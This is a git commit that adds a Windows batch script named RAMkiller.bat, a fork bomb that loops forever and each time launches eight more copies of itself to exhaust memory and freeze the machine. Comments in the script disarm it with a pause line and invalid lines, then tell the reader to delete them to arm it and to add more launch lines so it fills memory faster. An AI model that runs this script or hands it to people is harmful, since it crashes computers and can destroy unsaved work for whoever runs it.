2f3a3a6a824aa9b9d61f0acdfcc93acc2a8002b7
Tien Vu <timothyvu2002@gmail.com>
2016-12-02 13:01:16 -0500

    Add files via upload

---
+++ RAMkiller.bat
@@ -0,0 +1,25 @@
+@echo off
+title Matrix
+color 0a
+:1
+
+
+-=These words are not a comment, they are here to prevent accidental running (it's an issue)
+-=To make the program work faster, just copy-paste "start RAMkiller.bat" where it says to farther down
+-=You'll want to delete the "pause" line and lines starting with a -= to run the code
+pause
+
+type RAMK.txt
+start RAMkiller.bat
+start RAMkiller.bat
+start RAMkiller.bat
+start RAMkiller.bat
+start RAMkiller.bat
+start RAMkiller.bat
+start RAMkiller.bat
+start RAMkiller.bat
+-=Here's where you'll want to copy-paste "start RAMkiller.bat"
+
+goto 1
+
+stop
